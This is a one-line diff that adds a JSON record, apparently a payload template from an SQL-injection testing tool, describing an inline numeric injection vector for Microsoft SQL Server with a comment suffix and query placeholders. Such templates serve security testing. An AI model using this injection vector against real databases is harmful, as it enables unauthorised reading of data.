@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "inline", "boundary": {"prefix": "", "suffix": "-- -", "type": "numeric"}, "vector": "{B} AND 1=(SELECT ({Q}))", "comment": "mssql inline: numeric, inline comment"}
